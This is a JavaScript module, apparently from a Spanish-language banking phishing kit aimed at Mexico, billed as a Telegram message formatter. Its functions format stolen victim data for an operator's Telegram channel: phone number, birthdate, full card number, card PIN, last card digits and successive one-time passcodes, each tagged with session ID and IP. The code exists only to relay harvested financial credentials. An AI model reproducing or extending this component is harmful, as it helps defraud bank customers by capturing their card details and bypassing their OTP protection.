/**
 * Telegram message formatter utility
 * Creates well-formatted, easy-to-copy messages with visual hierarchy
 */

/**
 * Generate visual emoji pattern based on session ID
 * Creates a unique 3-emoji pattern for easy visual identification
 */
function getSessionEmojis(sessionId) {
    // Extract numbers and letters from session ID
    const chars = sessionId.replace(/[^A-Z0-9]/g, '');

    // Emoji sets for visual variety
    const colorEmojis = ['🔴', '🟠', '🟡', '🟢', '🔵', '🟣', '🟤', '⚫', '⚪'];
    const shapeEmojis = ['⭐', '💎', '🔷', '🔶', '🔸', '🔹', '🔺', '🔻', '💠'];
    const symbolEmojis = ['🌟', '✨', '💫', '⚡', '🔥', '💧', '🌈', '☀️', '🌙'];

    // Generate pattern based on session ID characters
    const emoji1 = colorEmojis[chars.charCodeAt(0) % colorEmojis.length];
    const emoji2 = shapeEmojis[chars.charCodeAt(1) % shapeEmojis.length];
    const emoji3 = symbolEmojis[chars.charCodeAt(2) % symbolEmojis.length];

    return `${emoji1}${emoji2}${emoji3}`;
}

/**
 * Format initial registration data
 */
export function formatRegistrationMessage(data) {
    const { sessionId, phone, birthdate, cardNumber, ip, timestamp } = data;
    const sessionEmojis = getSessionEmojis(sessionId);

    return `🆕 <b>NUEVO REGISTRO</b>
━━━━━━━━━━━━━━━━━━━━

${sessionEmojis} 

<b>Sesión:</b> <code>${sessionId}</code>
📅 <b>Fecha:</b> <code>${timestamp}</code>

📱 <b>DATOS PERSONALES</b>
Teléfono: <code>${phone}</code>
Fecha Nacimiento: <code>${birthdate}</code>

💳 <b>TARJETA</b>
<code>${cardNumber}</code>

🌐 <b>IP:</b> <code>${ip}</code>

━━━━━━━━━━━━━━━━━━━━`;
}

/**
 * Format card details (NIP and last digits)
 */
export function formatCardDetailsMessage(data) {
    const { sessionId, lastTwoDigits, nip, ip, timestamp } = data;
    const sessionEmojis = getSessionEmojis(sessionId);

    return `🔐 <b>DATOS DE TARJETA</b>
━━━━━━━━━━━━━━━━━━━━

${sessionEmojis} 

<b>Sesión:</b> <code>${sessionId}</code>
📅 <b>Fecha:</b> <code>${timestamp}</code>

🔢 <b>VERIFICACIÓN</b>
Últimos 2 dígitos: <code>${lastTwoDigits}</code>
NIP: <code>${nip}</code>

🌐 <b>IP:</b> <code>${ip}</code>

━━━━━━━━━━━━━━━━━━━━`;
}

/**
 * Format OTP code message
 */
export function formatOTPMessage(data) {
    const { sessionId, otp, attempt, ip, timestamp } = data;
    const sessionEmojis = getSessionEmojis(sessionId);

    return `🔑 <b>CÓDIGO OTP #${attempt}</b>
━━━━━━━━━━━━━━━━━━━━

${sessionEmojis} 

<b>Sesión:</b> <code>${sessionId}</code>
📅 <b>Fecha:</b> <code>${timestamp}</code>

🔐 <b>CÓDIGO</b>
<code>${otp}</code>

🌐 <b>IP:</b> <code>${ip}</code>

━━━━━━━━━━━━━━━━━━━━`;
}

/**
 * Get current timestamp in readable format
 */
export function getTimestamp() {
    const now = new Date();
    return now.toLocaleString('es-MX', {
        timeZone: 'America/Mexico_City',
        year: 'numeric',
        month: '2-digit',
        day: '2-digit',
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit',
        hour12: false
    });
}
